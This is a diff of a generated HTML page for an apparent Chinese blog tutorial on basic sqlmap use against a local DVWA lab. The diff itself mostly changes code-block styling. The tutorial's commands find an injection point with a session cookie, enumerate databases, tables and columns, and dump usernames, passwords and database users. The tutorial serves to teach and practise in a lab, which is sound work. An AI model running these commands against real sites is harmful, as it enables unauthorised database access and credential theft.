@@ -33,6 +33,7 @@
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Marmalade's Blog" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
@@ -565,7 +566,7 @@
 <p>以DVWA的low等级为实验网站,url为<code>http://127.0.0.1/DVWA-master/vulnerabilities/sqli/</code></p>
 </blockquote>
 <p><strong>(1)判断是否有注入点</strong><br>首先三步拿到url<br><img src="/images/sqlmapbasicuse/1.png" alt="03d75491bfd3b0989cda112f18a5626b.png"></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py  -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py  -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>注：当注入点后的参数大于等于两个时，需要加双引号</p>
 </blockquote>
@@ -573,8 +574,8 @@
 <p>结果显示如下<br><img src="/images/sqlmapbasicuse/2.png" alt="7597e5bf9a8503668c6acde63dee578f.png"><br>发现没有找到注入点。</p>
 <p>从结果看发现我们是需要cookie的，然后去dvwa看一下cookie</p>
 <p>然后在命令中加入cookie：</p>
-<pre class=" language-bash"><code class="language-bash">
-python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">
+python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>如果出现以下结果则表明sqlmap检测到有可以注入的地方<br><img src="/images/sqlmapbasicuse/3.png" alt="30235e9a3dfae35f806441331df7a74e.png"></p>
 <p><strong>(2)判断文本中的请求是否存在注入</strong></p>
 <p>sqlmap可以从一个文本文件中获取http请求（这样的好处在于：不用设置其他参数，例如cookie、post数据等）</p>
@@ -585,32 +586,32 @@ python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vu
 </blockquote>
 <p><strong>(3)查询当前用户下的所有数据库</strong></p>
 <p>小提示：首先你要先确定有注入点，才能用该命令查询用户的数据库</p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py  -u  <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --dbs</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py  -u  <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>执行后会拿到数据库信息<br><img src="/images/sqlmapbasicuse/5.png" alt="4079615a55a3fb4f22d5e5ff52dfe6f4.png"></p>
 <p><strong>(4)获取数据库中表的信息</strong></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa --tables</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>可以拿到dvwa库中所有表的名字<br><img src="/images/sqlmapbasicuse/6.png" alt="bab165841e616ed70eea4fad1495fa91.png"></p>
 <blockquote>
 <p>注：将上一条命令中的–table缩写成-T时，表示在某表中继续查询<br>       若在该命令中不加-D参数来指定具体的数据库，那么sqlmap会把数据库中所有表列出</p>
 </blockquote>
 <p><strong>(5)获取表中的字段信息</strong></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa -T <span class="token function">users</span> --columns</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa -T <span class="token function">users</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>拿到了表中的所有字段<br><img src="/images/sqlmapbasicuse/7.png" alt="8475adb05acdab6fc0b7197226e03087.png"></p>
 <blockquote>
 <p>注：在后续注入中 –columns可以缩写成-C</p>
 </blockquote>
 <p><strong>(6)获取字段内容</strong></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa -T <span class="token function">users</span> -C username,password --dump</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> -D dvwa -T <span class="token function">users</span> -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里获取的是dvwa数据库里的users表中的username和password的值<br><img src="/images/sqlmapbasicuse/8.png" alt="e61e6bfb9438a7f9b9c8bb5a5af80de8.png"></p>
 <p><strong>(7)获取数据库的所有用户</strong></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --users</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>(8)获取数据库</strong></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --passwords</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --passwords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>(9)获取当前网站数据库的名称</strong></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --current-db</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/sqlmapbasicuse/9.png" alt="a9215034277537f3c18a2e891bf9640d.png"></p>
 <p><strong>(10)获取当前网站数据库的用户名称</strong></p>
-<pre class=" language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --current-user</code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="token string">"security=low;PHPSESSID=b3qlu23g2t781bk3aslt******"</span> --current-user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/sqlmapbasicuse/10.png" alt="984c2a56621209c4e9284cd63103991b.png"></p>
 
                 
@@ -1374,7 +1375,7 @@ python2 sqlmap.py -u <span class="token string">"http://127.0.0.1/DVWA-master/vu
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">28.5k</span>&nbsp;字
+                class="white-color">28.8k</span>&nbsp;字
             
             
             
